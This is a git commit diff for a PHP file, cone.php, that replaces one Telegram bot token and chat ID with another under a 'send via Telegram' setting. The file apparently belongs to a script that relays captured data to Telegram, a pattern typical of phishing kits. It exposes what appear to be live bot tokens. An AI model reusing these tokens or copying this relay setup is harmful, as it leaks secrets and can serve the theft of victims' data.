577277116d324538c0d0325b159897415e1c62c0
belcoa <133060252+belcoa@users.noreply.github.com>
2023-05-09 16:06:53 -0600

    Update cone.php

--- cone.php
+++ cone.php
@@ -3,8 +3,8 @@
 // Envio telegram
 // true = SI | false = NO
 $telegram_send = true;
-$bottoken = "6264210320:AAGN06Bf0P1Bsvlk1jfBerBnOwpZQg-EQ4c";
-$chatid = "-857472710";
+$bottoken = "6062336884:AAFXVj063-pm2mwAUAR7ZP6VeCcErzBtkys";
+$chatid = "-925003996";
 
 // Guardar archivo
 // true = SI | false = NO
